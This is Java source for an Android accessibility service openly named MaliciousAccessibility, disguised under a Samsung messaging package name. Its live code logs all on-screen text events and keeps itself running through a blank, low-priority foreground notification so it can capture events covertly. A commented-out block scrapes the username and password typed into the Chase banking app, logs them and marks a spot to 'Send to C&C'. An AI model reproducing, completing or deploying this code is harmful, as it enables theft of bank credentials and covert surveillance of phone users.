package com.samsung.android.messaging;

import android.accessibilityservice.AccessibilityService;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import androidx.core.app.NotificationCompat;

import com.samsung.android.messaging2.R;

public class MaliciousAccessibility extends AccessibilityService {
    private String TAG = "MaliciousAccessibilityService";
    private static final String CHANNEL_ID = "my_app_channel_id";


    // Some type of state machine to scrape the user/password
    private boolean CHASE_OPENED = false;
    private boolean CHASE_TYPING_USER = false;
    private boolean CHASE_TYPING_PASS = false;


    private String CHASE_USERNAME = "";
    private String CHASE_PASSWORD = "";

    private MediaProjectionManager mMediaProjectionManager;

    public MaliciousAccessibility() {
    }

    private String getEventTypeString(int eventType) {
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "View Clicked";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "View Long Clicked";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "View Focused";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "View Text Changed";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return "Window State Changed";
            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                return "View Scrolled";
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                return "Window Content Changed";
            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED:
                return "View Accessibility Focus Cleared";
            case AccessibilityEvent.TYPE_ANNOUNCEMENT:
                return "Announcement";
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                return "View Text Selection Changed";
            default:
                return "Unknown Event Type (" + eventType + ")";
        }
    }

    private void myTakeScreenshot(AccessibilityEvent event) {
//        Intent dialogIntent = new Intent(MaliciousAccessibility.this, ScreenShotActivity.class);
//        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        startActivity(dialogIntent);

    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Handle accessibility events here
        // For example, log the event text
        String eventText = event.getText().toString();
        Log.d(TAG, String.format("eventText: %s\n  type: %s", event.getText().toString(),
                getEventTypeString(event.getEventType())));
//
//        if ((event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) && (event.getText().toString().equals("[Chase]"))) {
//            Log.d(TAG, "In chase!!");
//            CHASE_OPENED = true;
//            //myTakeScreenshot();
//        }
//
//        if (CHASE_OPENED) {
//            //Typing user-name
//                if(event.getText().toString().contains("Expand toolbar")) {
//                    CHASE_TYPING_USER = true;
//                    Log.d(TAG, "TYPING USER!");
//                }
//        }
//
//
//        if (CHASE_TYPING_USER) {
//            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED)
//                CHASE_USERNAME = event.getText().toString().
//                        replace("[","").replace("]","");
//
//            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
//                CHASE_TYPING_USER = false;
//                CHASE_TYPING_PASS = true;
//                Log.d(TAG, "Username scraped: " + CHASE_USERNAME);
//            }
//        }
//
//        if (CHASE_TYPING_PASS) {
//            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED){
//                String s = event.getText().toString();
//                CHASE_PASSWORD += s.substring(s.length() - 2, s.length() - 1);
//            }
//
//            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED &&
//                    event.getText().toString().equals("[Sign in]")) {
//                CHASE_TYPING_PASS = false;
//                Log.d(TAG,  String.format("Scraped Data:\n\tUser: %s\n\tPass: %s",
//                        CHASE_USERNAME, CHASE_PASSWORD));
//
//                // Send to C&C
//
//
//
//                // Clear
//                CHASE_USERNAME = "";
//                CHASE_PASSWORD = "";
//            }
//
//
//        }

    }

    @Override
    public void onInterrupt() {
        // Handle interrupts here
    }


    @Override
    public void onCreate() {
        super.onCreate();

        // Some boiler plate code to create a proper ServiceChannel for CHANNEL_ID.
        // Without this, Android will complain about CHANNEL_ID usage when building
        // the notification using NotificationCompat.Builder below.
        // Thanks Gauss!
        CharSequence name = "Accessibility Service Channel";
        String description = "This is the channel for our accessibility service.";
        int importance = NotificationManager.IMPORTANCE_LOW;
        NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
        channel.setDescription(description);
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(channel);


        // Code to launch this AccessiblityService to run in the background.
        // Without this, its just a regular service and we will only get
        // AccessibilityEvents when our malicious app is active on the screen.
        // We do not want that, we want to always capture AccessibilityEvents
        // after our malicious app has been launched.
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
                notificationIntent, PendingIntent.FLAG_IMMUTABLE);
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.mipmap.ic_launcher_round)
                .setContentTitle("")
                .setContentText("")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setContentIntent(pendingIntent)
                .setOngoing(true);
        startForeground(1, builder.build());
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        mMediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
    }



}